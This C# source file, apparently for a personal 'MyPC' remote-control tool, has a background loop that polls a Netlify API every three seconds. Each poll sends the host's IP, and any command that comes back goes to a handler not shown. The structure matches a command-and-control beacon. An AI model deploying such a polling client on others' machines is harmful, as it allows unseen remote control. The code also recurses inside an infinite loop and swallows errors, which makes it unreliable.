using System.Text.Json;
using System.Text.Json.Nodes;

namespace MyPC.requests;

public class Requests
{
    private HttpClient client;
    
    public Requests()
    {
        client = new HttpClient();

        Task.Run(Loop);
    }

    public async Task Loop()
    {
        while (true)
        {
            try
            {
                CommandResponse response = await SendRequest();
                Program.commandHandler.Handle(response);

                await Task.Delay(3000);
                await Loop();
            }
            catch (Exception ignore)
            {

            }
        }
    }

    public async Task<CommandResponse> SendRequest()
    {
        CommandResponse def = new CommandResponse { Command = "", Parameters = new List<Param>() };
            
        string ip = Utils.GetIP();
        string url = $"https://mypcapi.netlify.app/.netlify/functions/api/get?ip={ip}";
        
        try
        {
            HttpResponseMessage response = await client.GetAsync(url);
            response.EnsureSuccessStatusCode();
            string responseContent = await response.Content.ReadAsStringAsync();
            
            var ipCommand = JsonSerializer.Deserialize<JsonElement>(responseContent);

            if (ipCommand.TryGetProperty("command", out var command))
            {
                string? name = command.GetProperty("name").GetString();
                var paramsElement = command.GetProperty("params");

                var paramList = new List<Param>();
                foreach (var prop in paramsElement.EnumerateObject())
                {
                    paramList.Add(new Param { Name = prop.Name, Value = prop.Value.GetString() ?? "" });
                }

                var commandResponse = new CommandResponse
                {
                    Command = name ?? "",
                    Parameters = paramList
                };

                return commandResponse;
            }
        }
        catch (Exception ignore)
        {
            return def;
        }

        return def;
    }
}